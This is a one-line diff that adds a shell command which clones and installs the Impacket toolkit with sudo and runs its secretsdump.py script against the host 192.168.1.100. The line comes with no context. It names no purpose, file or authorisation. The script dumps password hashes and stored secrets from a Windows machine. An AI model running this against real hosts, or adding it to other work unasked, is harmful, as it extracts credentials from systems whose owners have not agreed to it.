@@ -1,0 +1,1 @@
+sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket && cd /opt/impacket && pip3 install . && python3 examples/secretsdump.py 192.168.1.100
